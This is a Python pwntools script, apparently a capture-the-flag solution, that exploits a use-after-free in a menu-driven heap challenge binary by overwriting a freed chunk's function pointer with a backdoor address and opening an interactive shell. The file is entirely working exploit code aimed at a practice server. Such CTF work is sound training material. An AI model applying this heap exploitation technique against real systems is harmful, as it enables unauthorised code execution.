#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sd = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()
context.log_level = 'debug'


if(sys.argv[1] =='l'):
    p = process('./ydsneedgirlfriend2')
    elf = ELF('./ydsneedgirlfriend2')
else:
    p = remote('node3.buuoj.cn',28735)
    elf = ELF('./ydsneedgirlfriend2')


def menu(cmd):
    sla('u choice :\n',str(cmd))

def add(size,name):
    menu(1)
    sla('Please input the length of her name:',str(size))
    sla('Please tell me her name:\n',name)

def delete(idx):
    menu(2)
    sla('Index :',str(idx))

def show(idx):
    menu(3)
    sla('Index :',str(idx))

backdoor = elf.symbols['backdoor']

add(0x30,'aaaa')#0
add(0x30,'bbbb')#1
add(0x30,'cccc')

delete(0)
delete(1)

add(0x10,p64(0)+p64(backdoor))
show(0)

ia()